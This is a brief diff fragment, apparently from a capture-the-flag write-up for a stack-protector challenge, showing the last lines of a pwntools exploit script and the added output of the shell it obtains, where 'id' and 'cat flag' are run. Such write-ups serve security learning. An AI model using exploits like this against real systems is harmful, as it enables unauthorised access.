@@ -193,3 +193,12 @@ p.sendlineafter('Name : ', payload)
 p.interactive()
 ```
 
+----
+```bash
+[*] Switching to interactive mode
+$ id
+uid=1000(ssp_001) gid=1000(ssp_001) groups=1000(ssp_001)
+
+$ cat flag
+DH{안알랴쥼}
+```
